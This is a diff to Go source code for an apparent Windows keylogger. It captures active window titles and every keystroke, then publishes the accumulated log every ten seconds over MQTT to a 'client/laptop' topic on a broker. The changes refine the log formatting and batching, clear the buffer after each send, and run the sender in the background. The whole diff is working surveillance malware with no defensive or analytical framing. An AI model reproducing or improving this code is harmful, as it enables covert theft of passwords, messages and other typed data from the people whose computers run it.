@@ -64,7 +64,7 @@ func windowLogger() {
 		if syscall.UTF16ToString(b) != "" {
 			if tmpTitle != syscall.UTF16ToString(b) {
 				tmpTitle = syscall.UTF16ToString(b)
-				tmpKeylog += string("[" + syscall.UTF16ToString(b) + "]\r\n")
+				tmpKeylog += string("\n[" + syscall.UTF16ToString(b) + "]\n")
 			}
 		}
 		time.Sleep(1 * time.Millisecond)
@@ -87,7 +87,7 @@ func keyLogger() {
 				case w32.VK_TAB:
 					tmpKeylog += "[Tab]"
 				case w32.VK_RETURN:
-					tmpKeylog += "[Enter]\r\n"
+					tmpKeylog += "[Enter]\n"
 				case w32.VK_SHIFT:
 					tmpKeylog += "[Shift]"
 				case w32.VK_MENU:
@@ -326,12 +326,18 @@ func sendMsg(topic string, payload string, qos byte, retained bool) mqtt.Token{
 func sendLog(){
 	create()
 	for {
-		fmt.Println(tmpKeylog)
-		token := sendMsg("client/laptop", tmpKeylog, byte(2), false)
+		time.Sleep(10 * time.Second)
+		if tmpKeylog == ""{
+			fmt.Println("Nothing to show")
+			continue
+		}
+		fmt.Print(tmpKeylog)
+		token := sendMsg("client/laptop", tmpKeylog, byte(0), false)
 		if token.Error() != nil {
 			fmt.Println(token.Error())
 			os.Exit(1)
 		}
+		tmpKeylog = ""
 	}
 }
 
@@ -342,7 +348,7 @@ func main() {
 
 	go keyLogger()
 	go windowLogger()
-	sendLog()
+	go sendLog()
 	/*fmt.Println("Press Enter to see logs.")
 	os.Stdin.Read([]byte{0})
 	fmt.Println(tmpKeylog)*/
